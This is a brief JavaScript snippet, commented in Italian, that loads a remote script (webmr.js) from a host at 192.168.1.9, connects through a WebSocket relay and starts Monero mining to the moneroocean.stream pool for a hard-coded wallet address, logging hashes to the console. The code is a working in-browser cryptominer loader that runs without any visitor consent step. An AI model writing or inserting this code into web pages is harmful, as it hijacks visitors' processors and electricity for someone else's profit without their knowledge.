// Include il file webmr.js dinamicamente
const script = document.createElement('script');
script.src = 'http://192.168.1.9:8000/webmr.js';  // Percorso del file webmr.js
document.head.appendChild(script);

// Dopo che webmr.js è caricato, esegui il mining
script.onload = () => {
  console.log('webmr.js is loaded. Starting mining in 3 seconds...');

  setTimeout(() => {
    server = 'ws://192.168.1.9:8181';  // WebSocket server

    // Avvia il mining
    startMining(
        'moneroocean.stream',
        '422QQNhnhX8hmMEkF3TWePWSvKm6DiV7sS3Za2dXrynsJ1w8U6AzwjEdnewdhmP3CDaqvaS6BjEjGMK9mnumtufvLmz5HJi');
    console.log('Mining started: Connected to server ' + server);

    // Mostra i log del mining nella console
    setInterval(() => {
      while (sendStack.length > 0) console.log('Sent: ', sendStack.pop());
      while (receiveStack.length > 0)
        console.log('Received: ', receiveStack.pop());
      console.log('Total hashes calculated: ' + totalhashes);
    }, 2000);
  }, 3000);  // Avvia il mining dopo 3 secondi
};
